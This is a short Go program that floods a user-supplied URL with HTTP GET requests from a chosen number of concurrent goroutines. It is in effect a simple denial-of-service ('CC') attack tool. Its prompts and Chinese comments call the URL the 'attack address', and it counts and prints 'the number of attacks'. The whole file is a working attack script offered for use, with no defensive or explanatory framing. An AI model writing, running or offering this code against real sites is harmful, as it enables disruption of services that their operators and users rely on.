package main

import (
	"fmt"
	"net/http"
	"sync"
)

var wg sync.WaitGroup

func cc(url string, num int) {
	num2 := 0
	for true {
		num2++
		//request, _ := http.Get(url)
		http.Get(url)
		fmt.Printf("The current thread is %d and the number of attacks is %d\n", num, num2)
		//fmt.Println("Status of this request:", request.StatusCode)
	}
	wg.Done()
}
func main() {
	url := ""
	var s int
	//获取攻击地址
	fmt.Print("URL address: ")
	fmt.Scanln(&url)
	//获取攻击线程
	fmt.Print("Concurrent number: ")
	fmt.Scanln(&s)
	for i := 1; i <= s; i++ {
		wg.Add(1)
		fmt.Println("Thread created: ", i)
		go cc(url, i)
	}
	wg.Wait()
}
